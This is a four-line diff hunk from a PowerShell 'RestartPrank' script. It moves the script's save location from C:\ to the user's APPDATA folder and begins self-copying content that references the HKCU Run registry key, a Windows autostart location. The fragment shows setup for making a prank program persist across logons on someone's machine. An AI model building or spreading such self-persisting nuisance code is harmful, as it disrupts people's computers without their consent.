@@ -1,4 +1,4 @@
-$path = "C:\RestartPrank.ps1"
+$path = "$env:APPDATA\RestartPrank.ps1"
 $content = @"
 `$currentFile = `"$path`"
 `$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
